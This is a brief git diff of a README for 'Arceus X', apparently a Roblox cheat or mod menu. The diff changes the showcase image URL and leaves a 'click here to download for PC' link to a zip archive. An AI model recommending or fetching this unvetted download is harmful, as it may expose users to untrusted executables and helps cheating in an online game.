@@ -1,6 +1,6 @@
 # Arceus X Roblox Mod Menu
 
-[![Arceus X Mod](https://i.ibb.co/JQ933yb/arceus-x-mod-menu-showcase.png)](https://arceus-x.net/)
+[![Arceus X Mod](https://github.com/arceusx-roblox/arceusx-roblox.github.io/blob/main/arceus_x_mod_menu_showcase.png?raw=true)](https://arceus-x.net/)
 
 [CLICK HERE TO DOWNLOAD FOR PC](https://github.com/arceusx-roblox/arceusx-roblox.github.io/releases/download/v2/Arceus.X.zip)
 
